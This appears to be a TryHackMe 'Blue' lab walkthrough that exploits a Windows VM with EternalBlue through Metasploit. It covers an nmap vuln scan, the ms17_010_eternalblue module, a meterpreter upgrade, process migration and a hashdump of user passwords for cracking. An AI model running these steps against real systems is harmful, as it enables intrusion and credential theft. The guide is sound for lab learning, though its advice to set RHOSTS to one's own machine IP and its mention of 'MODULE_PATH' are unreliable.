# Blue

## Exploiting windows machine using eternal blue on metasploit

before you start launch your openvpn server or run this command in linux

```
sudo openvpn yourfile.ovpn
```
to make it quicker to access the virtual machine, save its IP as a variable
```
export IP=10.10.2.1
```
then you can call the IP very quickly with $IP

example where this could be helpful

```
ping $IP
```

## Recon

first scan with Nmap to find vulnerabiltites

```
nmap -sV -vv --script vuln $IP
```

the vulnerability we found was ms17-010, also known as eternal blue.

## Gain access

start metasploit console

```
msfconsole
```

The explot we will run against the VM is Eternal blue, so the code for that is

```
use exploit/windows/smb/ms17_010_eternalblue
```

You will need to change the host IP. To do that you can use set and change the hosts IP to your local machine found in Tryhackme.com/access. Mine is 10.9.2.22 for example.

```
set rhosts 10.9.2.22
```
then run the exploit

```
run
```

if you want to run this session in the background you can with:
```
ctrl + z
```

## Escalate

### how to upgrade shell in metasploit

Having our recent eternal blue exploit in the background, we can move forward to convert our shell to meterpreter shell

first, check our session has worked

```
sessions -l
```

this should list our sessions and it should be there under session 1. If it's not there, then we have to back to the start of gain access and try again.

We need to run our meterpreter shell against our first session

so with our shell in the background run
```
use post/multi/manage/shell_to_meterpreter
```
now we have to change the MODULE_PATH to find our previous eternal blue session

To do that show the options with:
```
show options
```

You should see there is a parameter called SESSION that needs to be set

```
set SESSION 1
```
 This should tell us to read from the eternal blue session
 and now..

```
run
```
we should be in the Windows machine as NT AUTHORITY\SYSTEM

we can check by opening a DOS command line using
```
shell
```
now we are in the DOS. Type in:
```
whoami
```

Now, we need to list all processes so we can migrate to a process to escalate our priveledge and gain full access

run ps command to see all processes
```
 ps
```
now we can look for a process that is running as NT AUTHORITY and migrate to its process number (the number on the far left)
```
migrate 3056
```
We are in.

## Cracking

Now we are in the machine, we can run:
```
hashdump
```
to show all passwords the users on this machine

now we can crack Jon's password by trying crackstation or Kali's hashidenitfier.


## Find the flags

to be updated...




